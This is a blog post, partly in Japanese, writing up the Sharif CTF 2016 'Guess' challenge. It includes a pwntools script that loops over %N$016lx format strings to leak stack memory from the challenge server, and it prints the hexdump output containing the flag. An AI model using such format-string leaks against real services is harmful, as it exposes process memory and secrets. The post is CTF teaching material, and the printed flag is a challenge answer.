---
layout: post
alias: "/blog/2016/12/19/sharif-ctf-2016-guess/"
date: "2016-12-19T23:44:15+09:00"
title: "Sharif CTF 2016: Guess"
tags: [ "ctf", "writeup", "pwn", "sharif-ctf", "format-string-attack" ]
---

Sharif CTFは特に暗号問が良かったのですが、私には$1$問も解けませんでした。
pwnはこの問題を含めblind FSAが$3$問出て、悪くはないけどつらかった。

## problem

The program has an obvious format-string bug. However the binary is not given.

``` sh
$ nc ctf.sharif.edu 54517
hoge
Hidden string is at somewhere.
hoge
%p
Hidden string is at somewhere.
0x7fdbed525323
^C
```

## solution

The flag exists on the stack.
Use `%N$lx`, and wait for a wihle.

``` sh
$ /.a.py
[+] Opening connection to ctf.sharif.edu on port 54517: Done
[*] 00000000  23 f3 a7 3b  bc 7f 00 00                            │#··;│····││
[*] 00000000  a0 07 a8 3b  bc 7f 00 00                            │···;│····││
[*] 00000000  00 4c 7b 3b  bc 7f 00 00                            │·L{;│····││
[*] 00000000  a0 07 a8 3b  bc 7f 00 00                            │···;│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  48 25 f0 6f  ff 7f 00 00                            │H%·o│····││
[*] 00000000  99 45 45 58  01 00 00 00                            │·EEX│····││
[*] 00000000  25 35 24 30  31 36 6c 78                            │%5$0│16lx││
[*] 00000000  20 25 31 30  24 30 31 36                            │ %10│$016││
[*] 00000000  6c 78 20 25  31 31 24 30                            │lx %│11$0││
[*] 00000000  31 36 6c 78  20 25 31 32                            │16lx│ %12││
[*] 00000000  24 30 31 36  6c 78 0a 00                            │$016│lx··││
[*] 00000000  00 03 40 00  00 00 00 00                            │··@·│····││
[*] 00000000  a8 61 ca 3b  bc 7f 00 00                            │·a·;│····││
[*] 00000000  00 00 00 00  00 00 00 00                            │····│····││
[*] 00000000  60 50 ca 3b  bc 7f 00 00                            │`P·;│····││
...
[*] 00000000  3c 05 64 2d  e3 7f 00 00                            │<·d-│····││
[*] 00000000  a0 fa ec dd  fe 7f 00 00                            │····│····││
[*] 00000000  28 dd 62 2d  e3 7f 00 00                            │(·b-│····││
[*] 00000000  58 ac 63 2d  e3 7f 00 00                            │X·c-│····││
[*] 00000000  53 68 61 72  69 66 43 54                            │Shar│ifCT││
[*] 00000000  46 7b 61 35  64 34 32 38                            │F{a5│d428││
[*] 00000000  36 33 32 63  63 63 37 62                            │632c│cc7b││
[*] 00000000  66 64 33 35  37 63 36 61                            │fd35│7c6a││
[*] 00000000  31 32 38 61  37 38 61 35                            │128a│78a5││
[*] 00000000  38 63 7d 00  e3 7f 00 00                            │8c}·│····││
[*] 00000000  c0 44 bf 2d  e3 7f 00 00                            │·D·-│····││
[*] 00000000  7c 57 9d 2d  e3 7f 00 00                            │|W·-│····││
[*] 00000000  78 ad 63 2d  e3 7f 00 00                            │x·c-│····││
KeyboardInterrupt
[*] Closed connection to ctf.sharif.edu port 54517
```

## implementation

``` python
#!/usr/bin/env python2
import itertools
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='ctf.sharif.edu')
parser.add_argument('port', nargs='?', default=54517, type=int)
parser.add_argument('--log-level', default='info')
args = parser.parse_args()
context.log_level = args.log_level

p = remote(args.host, args.port)
for i in itertools.count():
    p.sendline('%%%d$016lx %%%d$016lx %%%d$016lx %%%d$016lx' % (4*i+1, 4*i+2, 4*i+3, 4*i+4))
    p.recvuntil('Hidden string is at somewhere.\n')
    for s in p.recvline().split():
        log.info(fiddling.hexdump(p64(int(s, 16))).splitlines()[0])
```
